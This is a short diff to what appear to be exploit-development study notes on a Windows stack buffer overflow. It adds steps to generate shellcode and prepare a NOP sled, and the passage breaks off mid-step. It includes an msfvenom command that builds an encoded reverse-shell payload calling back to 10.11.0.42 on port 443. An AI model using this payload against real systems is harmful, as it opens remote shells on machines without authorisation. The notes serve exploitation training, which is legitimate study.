@@ -75,6 +75,11 @@ We need to find a module that contains a `JMP ESP` instruction which we can poin
 
 __Generate and use shellcode__
 
+1. Generate shellcode, target specific platform (windows x86), encode payload, avoid bad characters
+   `$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
+   In front of the shellcode are instructions to decode the encoded payload.
+2. We need to provide the shellcode docoder some stack-space to work with
+   * Append NOP instructions: 
 
 
 
